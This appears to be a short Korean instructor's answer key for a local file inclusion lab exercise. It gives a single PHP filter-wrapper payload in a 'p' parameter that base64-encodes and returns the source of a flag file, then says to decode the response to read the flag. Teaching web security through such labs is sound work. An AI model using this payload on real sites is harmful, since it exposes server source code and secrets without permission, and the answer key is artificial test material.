# [강사용] LFI #1 (원본 풀이)
```
?p=php://filter/convert.base64-encode/resource=lfiflag.php
```
응답 base64 디코딩 → `<?php $flag = "flag{...}";`.
